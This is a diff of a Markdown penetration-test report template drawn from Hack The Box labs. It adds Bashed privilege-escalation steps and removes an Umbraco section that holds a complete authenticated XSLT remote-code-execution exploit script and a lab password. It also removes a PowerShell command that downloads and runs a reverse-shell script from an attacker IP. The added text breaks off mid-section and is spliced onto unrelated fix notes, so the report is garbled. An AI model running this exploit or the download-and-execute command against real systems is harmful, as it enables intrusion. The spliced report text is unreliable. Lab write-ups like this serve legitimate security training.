@@ -206,6 +206,7 @@ nc -lnvp 9999
 On the bashed host we enter this command in the php shell:
 ```
 /dev/shm/perl-reverse.pl
+```
 
 On our host we receive a reverse shell back:
 ![ImgPlaceholder](screenshots/reverse-shell.png)
@@ -247,129 +248,29 @@ We find that www-data (the account we are logged in with) has sudo permission to
 
 ![ImgPlaceholder](screenshots/sudo-www-data.png)
 
+In /home/arrexel we find the user flag:
+
+![ImgPlaceholder](screenshots/user.png)
+
+We sudo to scriptmanager:
+
+```
+www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:~$ cd /scripts/
+scriptmanager@bashed:/scripts$ ls -al
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Jan  5 14:28 test.txt
+scriptmanager@bashed:/scripts$ cat test.py
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+```
+
+We find a test.txt file with root permissions indicating the test.py file is executed with privileged root. We can use this to create a privesc script by replacing/changing the script:
 **Vulnerability Fix:**
-
-* Close NSF access
-* Remove read access to everyone
-* Remove Umbraco backup file
-
-**Severity:** Critical
-
-Browsing to the web directory showed a Umbraco CMS webportal login:
-
-
-http://10.10.10.180/umbraco/#/login
-
-**RCE Umbraco:
-
-```
-searchsploit umbraco
---------------
- Exploit Title                                                             
---------------
-Umbraco CMS - Remote Command Execution (Metasploit)               | windows/webapps/19671.rb
-Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution        | aspx/webapps/46153.py
-Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting        | php/webapps/44988.txt
---------------
-Shellcodes: No Results
-Papers: No Results
-
-```
-
-**Proof of Concept Code Here:**
-
-```
-# Date: 2020-03-28
-# Exploit Author: Alexandre ZANNI (noraj)
-# Based on: https://www.exploit-db.com/exploits/46153
-# Vendor Homepage: http://www.umbraco.com/
-# Software Link: https://our.umbraco.com/download/releases
-# Version: 7.12.4
-# Category: Webapps
-# Tested on: Windows IIS
-# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
-
-import requests
-import re
-import argparse
-
-from bs4 import BeautifulSoup
-
-parser = argparse.ArgumentParser(prog='exploit.py',
-    description='Umbraco authenticated RCE',
-    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
-parser.add_argument('-u', '--user', metavar='USER', type=str,
-    required=True, dest='user', help='username / email')
-parser.add_argument('-p', '--password', metavar='PASS', type=str,
-    required=True, dest='password', help='password')
-parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
-    dest='url', help='root URL')                                                                                                                          
-parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,                                                                            
-    dest='command', help='command')                                                                                                                       
-parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,                                                                        
-    dest='arguments', help='arguments', default='')                                                                                                       
-args = parser.parse_args()                                                                                                                                
-                                                                                                                                                          
-# Payload                                                                                                                                                 
-payload = """\                                                                                                                                            
-<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\                                               
-""" % (args.arguments, args.command)                                                                                                                      
-                                                                                                                                                          
-login = args.user                                                                                                                                         
-password = args.password                                                                                                                                  
-host = args.url                                                                                                                                           
-                                                                                                                                                          
-http_proxy  = "http://127.0.0.1:8080"                                                                                                                     
-https_proxy  = "http://127.0.0.1:8080"                                                                                                                    
-ftp_proxy  = "http://127.0.0.1:8080"                                                                                                                      
-                                                                                                                                                          
-proxyDict = {                                                                                                                                             
-                      "http"  : http_proxy,                                                                                                               
-                      "https" : https_proxy,                                                                                                              
-                      "ftp"   : ftp_proxy                                                                                                                 
-                                                                                                                                                          
-}                                                                                                                                                         
-                                                                                                                                                          
-# Process Login                                                                                                                                           
-url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"                                                                              
-loginfo = { "username": login, "password": password}                                                                                                      
-s = requests.session()                                                                                                                                    
-r2 = s.post(url_login,json=loginfo, proxies=proxyDict )                                                                                                   
-                                                                                                                                                          
-# Go to vulnerable web page                                                                                                                               
-url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"                                                                                            
-r3 = s.get(url_xslt, proxies=proxyDict)                                                                                                                   
-                                                                                                                                                          
-soup = BeautifulSoup(r3.text, 'html.parser')                                                                                                              
-VIEWSTATE = soup.find(id="__VIEWSTATE")['value']                                                                                                          
-VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
-UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
-headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
-data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
-    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
-    "ctl00$body$xsltSelection": payload,
-    "ctl00$body$contentPicker$ContentIdValue": "",
-    "ctl00$body$visualizeDo": "Visualize+XSLT" }
-
-# Launch the attack
-r4 = s.post(url_xslt, data=data, headers=headers, proxies=proxyDict)
-# Filter output
-soup = BeautifulSoup(r4.text, 'html.parser')
-CMDOUTPUT = soup.find(id="result").getText()
-print(CMDOUTPUT)
-```
-# Execution exploit
-
-```
-python3 -m http.server 8080
-python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c 'powershell.exe' -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27:8000/reverse.ps1')"
-```
-
-
-
-![ImgPlaceholder](src/placeholder-image-300x225.png)
-
-\newpage
 
 ## Sample Report - Maintaining Access
 
